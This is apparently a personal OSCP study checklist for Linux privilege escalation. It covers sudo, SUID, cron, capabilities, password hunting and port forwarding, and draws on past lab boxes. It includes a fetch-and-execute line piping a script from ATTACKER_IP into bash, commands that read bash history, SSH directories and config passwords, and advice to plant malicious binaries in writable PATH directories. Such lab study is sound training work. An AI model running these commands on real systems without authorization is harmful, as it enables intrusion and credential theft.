# Linux Privilege Escalation — Master Checklist

Run in order. Stop when you get root.

## 1. Who Am I?
```bash
id && whoami
hostname
```
Check groups — `docker`, `lxd`, `adm`, `disk` are gold. See [[Docker-LXD]].

## 2. Sudo
```bash
sudo -l
```
Any NOPASSWD entries? Any `env_keep` with LD_PRELOAD? See [[Sudo-Abuse]].

## 3. Automated Enumeration
```bash
# LinPEAS — upload and run
curl http://ATTACKER_IP/linpeas.sh | bash

# Or transfer manually
wget http://ATTACKER_IP/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas_output.txt
```

## 4. SUID / SGID Binaries
```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
```
Cross-reference with [GTFOBins](https://gtfobins.github.io/#+suid). See [[SUID-SGID]].

## 5. Capabilities
```bash
getcap -r / 2>/dev/null
```
See [[Capabilities]].

## 6. Cron Jobs
```bash
cat /etc/crontab
ls -la /etc/cron*
crontab -l
```
See [[Cron-Jobs]]. Use pspy if no cron visible.

## 7. Writable Scripts / Services
```bash
find / -writable -type f 2>/dev/null | grep -v proc
```
See [[Writable-Services]].

## 8. Internal Services
```bash
ss -tlnp
netstat -tlnp
```
Anything on 127.0.0.1 only? MySQL, Redis, custom apps — port forward and attack.

## 9. Interesting Files
```bash
find / -name "*.txt" -o -name "*.conf" -o -name "*.bak" -o -name "*.old" 2>/dev/null | grep -v proc
cat /home/*/.bash_history 2>/dev/null
ls -la /home/*/.ssh/ 2>/dev/null
find / -name "*.db" -o -name "*.sqlite" 2>/dev/null | grep -v proc
```

## 10. Kernel Version
```bash
uname -a
cat /etc/os-release
```
See [[Kernel-Exploits]] — **last resort**, can crash the box.

## 11. Docker / LXD Group
```bash
id
```
If in `docker` or `lxd` group, see [[Docker-LXD]].

## 12. PATH Abuse
```bash
echo $PATH
find / -writable -type d 2>/dev/null
```
Writable directory in PATH? Drop malicious binary there.

## 13. NFS no_root_squash
```bash
cat /etc/exports
showmount -e TARGET_IP
```
See [[NFS-2049]].

## 14. Unusual Files
```bash
ls -la /opt/
ls -la /tmp/
ls -la /var/backups/
ls -la /home/*/
```

## 15. Password Hunting
```bash
grep -r "password" /etc/ 2>/dev/null
grep -r "password" /var/www/ 2>/dev/null
grep -r "password" /opt/ 2>/dev/null
find / -name "wp-config.php" -o -name "config.php" -o -name ".env" 2>/dev/null
```

> **THE #1 PRIVESC PEOPLE MISS**: the web app running on the box. Check `/var/www/`, `/opt/`, `/srv/` for config files with DB passwords. Those DB passwords almost always work for `su - root` or SSH as another user. **Password reuse is the most common privesc vector on OSCP.**

## 16. Internal-Only Services
```bash
ss -tlnp | grep 127
netstat -tlnp | grep 127
```
MySQL/Redis/custom app on localhost only? Port forward it to Kali and attack:
```bash
# From Kali (if you have SSH):
ssh -L 3306:REDACTED:3306 user@$IP
# Then: mysql -h 127.0.0.1 -u root -p
REDACTED

## Automated Tools

| Tool | URL |
|------|-----|
| LinPEAS | `https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh` |
| pspy | `https://github.com/DominicBreuker/pspy/releases` |
| linux-exploit-suggester | `https://github.com/The-Z-Labs/linux-exploit-suggester` |

---

## From Your Boxes

> **Most common privesc paths across 100+ boxes:**
> - **Sudo abuse** was the #1 privesc vector (12+ boxes): CozyHosting, Knife, Sunday, TartarSauce, Walla, Cockpit, LaVita, PostFish, Precious, Networked, Broker, Mentor
> - **SUID binaries** were #2 (10+ boxes): XposedAPI, Sorcerer, QuackerJack, Nibbles, DolphinV2, Astronaut, Natural, MZEEAV, Irked, Wheels
> - **Cron jobs** were #3 (10+ boxes): TartarSauce, Bashed, Networked, CMS101, Exfiltrated, Readys, Flu, LaVita, Ochima, OSCP C Charlie
> - **Docker/LXD group** appeared 3 times: Web01, Peppo, Tabby
> - **Writable services** appeared 2 times: SpiderSociety, Hetemit
> - **Kernel exploits** were rare but critical: Analytics (GameOverlay), Kiero (DirtyPipe), Snookums (PwnKit)
> - **Capabilities** appeared 4 times: Levram, CMS02, Web01-Dev, Quick
>
> **Key takeaway**: Run `sudo -l` and check SUID/cron FIRST. Those three cover 80%+ of Linux boxes.
